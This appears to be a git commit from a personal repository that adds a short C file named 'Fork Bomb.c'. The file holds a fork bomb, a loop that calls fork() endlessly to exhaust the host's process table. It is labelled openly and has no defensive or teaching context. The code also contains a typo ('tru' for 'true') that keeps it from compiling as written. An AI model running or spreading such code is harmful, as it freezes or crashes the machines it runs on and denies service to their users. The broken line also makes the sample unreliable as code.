d79331b91f0ac82ce7b2f42deb1b0cc3647d1f25
Patrick L <97918012+96Hydra@users.noreply.github.com>
2023-03-20 14:01:52 -0500

    Fork bomb

---
+++ C/Fork Bomb.c
@@ -0,0 +1,16 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdbool.h>
+
+
+int main (int argc, char **argv)
+{
+
+
+while (tru) {fork();}
+
+//printf("That's a lot of processes \n");
+
+
+}
